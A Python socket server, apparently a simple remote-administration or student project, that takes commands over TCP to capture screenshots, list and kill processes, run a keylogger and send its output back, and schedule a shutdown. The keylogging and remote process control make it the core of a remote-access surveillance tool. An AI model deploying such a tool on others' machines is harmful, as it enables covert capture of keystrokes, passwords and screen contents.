import sys
import socket
import threading
import time
from ScreenShot import*
from RunningProccess import*
from KeyLogger import*
from ShutDown import*
HEADER = 64
PORT = 5050
#SERVER = socket.gethostbyname(socket.gethostname())
SERVER = "127.0.0.1"
ADDR= (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "DISCONNECT!"
TAKE_SCREEN_SHOT = "TAKE SCREENSHOT"
RUNNING_PROCESS ="CHECK RUNNING PROCESS"
STOP_LISTING = "STOP LISTING"
KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
KEY_LOGGING ="KEY LOG"
SHUTDOWN = "SHUTDOWN"
CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def conn_send(conn,send_this):
    conn.send(send_this.encode(FORMAT))
def conn_recv(conn):
    return conn.recv(1024).decode(FORMAT)

def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            print(f"[{addr}] {msg}") 
            reply=""


            if msg == TAKE_SCREEN_SHOT:
                Take_Screenshot("ScreenShot.png")
                reply +="SREENSHOT TAKEN."


            elif msg == RUNNING_PROCESS:
                obj = wmi.WMI()
                print("pid   Process name")
                conn.send("pid   Process name".encode(FORMAT))
                for process in obj.Win32_Process():
                    print(f"{process.ProcessId:<10} {process.Name}")
                    conn.send(f"{process.ProcessId:<10} {process.Name}".encode(FORMAT))
                conn.send(STOP_LISTING.encode(FORMAT))
                reply +="PROCCESS LISTED"



            elif msg == KILL_PROCESS_VIA_PID:
                conn.send("Deleting process with PID: ".encode(FORMAT))
                pid = conn.recv(1024).decode(FORMAT)
                pid = int(pid)
                process_killed = kill_process_by_id(pid)
                if process_killed == True:
                    reply += f"PROCESS ID: {pid} TERMINATED"
                else:
                    reply += f"PROCESS ID: {pid} NOT FOUND"

            

            elif msg == KILL_PROCESS_VIA_NAME:
                conn.send("Deleting process with process's name: ".encode(FORMAT))
                p_name = conn.recv(1024).decode(FORMAT)
                process_killed = kill_process_by_name(p_name)
                if process_killed == True:
                    reply += f"{p_name} TERMINATED"
                else:
                    reply += f"{p_name} NOT FOUND"

            
            elif msg == KEY_LOGGING:
                conn.send("Key Logger is active ... ".encode(FORMAT))
                key_log_string = Key_Log()
                #print(key_log_string)
                conn.send(key_log_string.encode(FORMAT))
                reply += "KEYLOG FINISH"
            elif msg == SHUTDOWN:
                conn.send("Input time remained until shutdown: ".encode(FORMAT))
                sec = conn.recv(1024).decode(FORMAT)
                reply += f"SERVER WILL SHUTDOWN IN {sec} SECONDS"
                sec = int(sec)
                shutdown(sec)

            elif msg == CANCEL_SHUTDOWN:
                cancel_shutdown()
                reply += "SHUTDOWN CANCELED"

            elif msg == DISCONNECT_MESSAGE:
                reply +="CONNECTION TERMINATED!"
                connected = False
            else:
                reply += "MESSAGE RECEIVED."
            time.sleep(0.500)
            conn.send(reply.encode(FORMAT))
            #print(f"[{addr}] {msg}")    
            
    conn.close()


def start():
    server.listen()
    print(f"[LISTENING] Server is listening on {SERVER}")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target = handle_client, args= (conn,addr))
        thread.start()
        print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")


    
print("[STARTING] server is starting ...")
start()